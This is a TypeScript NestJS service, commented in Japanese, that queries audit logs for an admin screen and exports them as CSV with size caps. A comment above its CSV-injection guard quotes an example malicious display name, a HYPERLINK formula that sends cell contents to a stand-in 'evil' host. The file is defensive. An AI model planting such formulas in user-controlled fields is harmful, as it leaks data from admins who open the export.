import { Injectable } from '@nestjs/common';
import { PrismaService } from '../../prisma.service';

/**
 * #90: 監査ログの検索（管理画面用）。
 *
 * 3年で225万行を想定しているため、**必ず件数を絞って返す**。
 * 索引は (created_at) / (actor_id, created_at) / (action, created_at)。
 */

/** 1回に返す最大件数。指定が大きすぎても、ここで頭打ちにする。 */
export const MAX_TAKE = 200;

/** CSV エクスポートの上限。全件を1度に吐くとメモリと応答時間が破綻する。 */
export const MAX_EXPORT = 10000;

export interface AuditLogFilter {
  /** 実行者のメールアドレス（部分一致）。 */
  actor?: string;
  /** 操作種別。`user.` のような前方一致も受ける。 */
  action?: string;
  from?: Date;
  to?: Date;
}

@Injectable()
export class AuditQueryService {
  constructor(private prisma: PrismaService) {}

  private where(filter: AuditLogFilter) {
    const where: any = {};
    if (filter.actor) {
      where.actorEmail = { contains: filter.actor, mode: 'insensitive' };
    }
    if (filter.action) {
      where.action = { startsWith: filter.action };
    }
    if (filter.from || filter.to) {
      where.createdAt = {};
      if (filter.from) where.createdAt.gte = filter.from;
      if (filter.to) where.createdAt.lte = filter.to;
    }
    return where;
  }

  async list(filter: AuditLogFilter, skip = 0, take = 50) {
    const where = this.where(filter);
    const [items, totalCount] = await Promise.all([
      this.prisma.auditLog.findMany({
        where,
        orderBy: { createdAt: 'desc' },
        skip: Math.max(0, skip),
        take: Math.min(Math.max(1, take), MAX_TAKE),
      }),
      this.prisma.auditLog.count({ where }),
    ]);
    return { items, totalCount };
  }

  /**
   * CSV 文字列を作る。
   *
   * ⚠️ 値に `,` `"` 改行が入りうる（detail の JSON など）ため、必ず引用符で囲む。
   * 囲まないと列がずれ、**別の操作の記録に見える**。
   */
  async toCsv(filter: AuditLogFilter): Promise<string> {
    const rows = await this.prisma.auditLog.findMany({
      where: this.where(filter),
      orderBy: { createdAt: 'desc' },
      take: MAX_EXPORT,
    });

    const header = [
      '日時',
      '操作',
      '実行者',
      '実行者名',
      '対象種別',
      '対象',
      '対象名',
      'IP',
      '詳細',
    ];
    const lines = [header.map(quote).join(',')];
    for (const r of rows) {
      lines.push(
        [
          r.createdAt.toISOString(),
          r.action,
          r.actorEmail,
          r.actorName ?? '',
          r.targetType ?? '',
          r.targetId ?? '',
          r.targetName ?? '',
          r.ip ?? '',
          r.detail ? JSON.stringify(r.detail) : '',
        ]
          .map(csvCell)
          .join(','),
      );
    }
    // ⚠️ 上限に達したことを伝えないと、Admin は**全件のつもりで最新1万件だけ**を
    // 受け取る。「その操作は無かった」と誤って結論づけられるため、明示する。
    if (rows.length >= MAX_EXPORT) {
      lines.push(
        quote(
          `※ 上限 ${MAX_EXPORT} 件で打ち切りました。期間を絞って取得し直してください`,
        ),
      );
    }

    return lines.join('\n');
  }
}

/** CSV の1項目を引用符で囲む。内部の引用符は "" にする。 */
export function quote(value: string): string {
  return `"${String(value).replace(/"/g, '""')}"`;
}

/**
 * 表計算ソフトが数式として解釈する先頭文字を無害化する（CSV インジェクション対策）。
 *
 * ⚠️ **利用者は自分の表示名を自由に設定できる。**
 * `=HYPERLINK("http://evil/?"&A1)` のような名前にしておくと、それが
 * `actorName` として監査ログに残り、**Admin が CSV を Excel で開いた瞬間に
 * 数式として実行される**。監査ログは Admin が開く前提のものなので、狙われうる。
 *
 * 引用符で囲むだけでは防げない（Excel は引用符の中身を数式として解釈する）。
 * 先頭に `'` を付けて文字列として扱わせる。
 */
export function csvCell(value: string): string {
  const text = String(value ?? '');
  // ⚠️ **先頭の空白・タブ・改行を除いてから判定する。**
  // 表計算ソフトは前後の空白を無視して数式として解釈するため、
  // `  =1+1` や `\n=1+1` を素通しすると対策にならない。
  return quote(/^[\s]*[=+\-@]/.test(text) ? `'${text}` : text);
}
